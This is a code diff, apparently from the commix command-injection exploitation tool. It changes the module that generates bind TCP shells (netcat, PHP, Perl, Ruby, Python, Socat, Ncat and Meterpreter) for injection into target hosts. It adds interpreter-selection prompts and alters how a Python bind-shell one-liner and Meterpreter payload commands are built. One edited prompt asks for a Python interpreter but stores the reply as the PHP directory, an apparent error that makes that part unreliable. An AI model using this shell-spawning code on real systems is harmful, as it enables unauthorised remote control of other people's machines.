@@ -90,8 +90,8 @@ def set_php_working_dir():
     if php_dir in settings.CHOICE_YES:
       break
     elif php_dir in settings.CHOICE_NO:
-      question_msg = "Please provide a custom working directory for PHP (e.g. '" 
-      question_msg += settings.WIN_PHP_DIR + "') > "
+      question_msg = "Please provide a full path directory for Python interpreter (e.g. '" 
+      question_msg += settings.WIN_PYTHON_INTERPRETER + "') or 'python'> "
       settings.WIN_PHP_DIR = _input(settings.print_question_msg(question_msg))
       settings.USER_DEFINED_PHP_DIR = True
       break
@@ -106,8 +106,8 @@ Set up the Python working directory on the target host.
 def set_python_working_dir():
   while True:
     if not menu.options.batch:
-      question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
-      question_msg += "' as Python working directory on the target host? [Y/n] > "
+      question_msg = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER 
+      question_msg += "' as Python interpreter on the target host? [Y/n] > "
       python_dir = _input(settings.print_question_msg(question_msg))
     else:
       python_dir = "" 
@@ -116,13 +116,39 @@ def set_python_working_dir():
     if python_dir in settings.CHOICE_YES:
       break
     elif python_dir in settings.CHOICE_NO:
-      question_msg = "Please provide a custom working directory for Python (e.g. '" 
-      question_msg += settings.WIN_PYTHON_DIR + "') > "
-      settings.WIN_PYTHON_DIR = _input(settings.print_question_msg(question_msg))
+      question_msg = "Please provide a full path directory for Python interpreter (e.g. '" 
+      question_msg += "C:\\Python27\\python.exe') > "
+      settings.WIN_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
       settings.USER_DEFINED_PYTHON_DIR = True
       break
     else:
       err_msg = "'" + python_dir + "' is not a valid answer."  
+      print(settings.print_error_msg(err_msg))
+      pass
+
+"""
+Set up the Python interpreter on linux target host.
+"""
+def set_python_interpreter():
+  while True:
+    if not menu.options.batch:
+      question_msg = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
+      question_msg += "' as Python interpreter on the target host? [Y/n] > "
+      python_interpreter = _input(settings.print_question_msg(question_msg))
+    else:
+      python_interpreter = ""
+    if len(python_interpreter) == 0:
+       python_interpreter = "Y"
+    if python_interpreter in settings.CHOICE_YES:
+      break
+    elif python_interpreter in settings.CHOICE_NO:
+      question_msg = "Please provide a custom interpreter for Python (e.g. '" 
+      question_msg += "python27') > "
+      settings.LINUX_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
+      settings.USER_DEFINED_PYTHON_INTERPRETER = True
+      break
+    else:
+      err_msg = "'" + python_interpreter + "' is not a valid answer."  
       print(settings.print_error_msg(err_msg))
       pass
 
@@ -167,7 +193,7 @@ def netcat_version(separator):
 
   while True:
     nc_version = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like targets""" + Style.RESET_ALL + """ ]--- 
+---[ """ + Style.BRIGHT + Fore.BLUE + """Netcat bind TCP shells""" + Style.RESET_ALL + """ ]--- 
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 
@@ -238,14 +264,14 @@ def other_bind_shells(separator):
 
   while True:
     other_shell = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like bind TCP shells""" + Style.RESET_ALL + """ ]---
+---[ """ + Style.BRIGHT + Fore.BLUE + """Generic bind TCP shells""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP bind TCP shell.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl bind TCP shell.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby bind TCP shell. 
 Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python bind TCP shell.
 Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat bind TCP shell.
 Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Ncat bind TCP shell.
-\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Windows bind TCP shells""" + Style.RESET_ALL + """ ]---
+\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter bind TCP shells""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
 Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 
 \ncommix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)
@@ -318,7 +344,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
 
     # Python-bind-shell
     elif other_shell == '4':
-      other_shell = "python -c 'import pty,os,socket%0d" \
+      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import pty,os,socket%0d" \
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                     "s.bind((\"\"," + settings.LPORT + "))%0d" \
                     "s.listen(1)%0d" \
@@ -408,7 +434,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
         with open (output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          data = base64.b64encode(data)
+          #data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
 
         print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
@@ -420,11 +446,14 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
                           "set lport "+ str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-          set_python_working_dir()
-          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+        if settings.TARGET_OS == "win":
+          if not settings.USER_DEFINED_PYTHON_DIR: 
+            set_python_working_dir()
+          other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\"" 
         else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          if not settings.USER_DEFINED_PYTHON_INTERPRETER:
+            set_python_interpreter()
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
         msf_launch_msg(output)
       except:
         print(settings.SINGLE_WHITESPACE)
@@ -449,7 +478,7 @@ def bind_tcp_options(separator):
   while True:
     bind_tcp_option = _input("""   
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Bind TCP shells""" + Style.RESET_ALL + """ ]---     
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat bind TCP shell.
+Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' for netcat bind TCP shells.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other bind TCP shells.
 \ncommix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)
 
